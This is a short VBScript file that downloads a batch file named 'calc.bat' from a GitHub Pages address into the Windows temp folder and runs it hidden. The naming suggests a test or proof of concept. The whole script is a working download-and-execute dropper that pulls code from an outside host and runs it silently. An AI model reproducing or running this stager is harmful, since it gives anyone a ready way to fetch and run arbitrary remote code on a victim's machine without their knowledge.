Dim WinHttpReq, oStream, shell
strURL = "https://salvapuertas-ucases.github.io/ucases_test/calc.bat"
strDest = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\calc.bat"

Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", strURL, False
WinHttpReq.Send

If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1 ' Binary
    oStream.Write WinHttpReq.ResponseBody
    oStream.SaveToFile strDest, 2 ' Overwrite
    oStream.Close
    
    Set shell = CreateObject("WScript.Shell")
    shell.Run strDest, 0, True
End If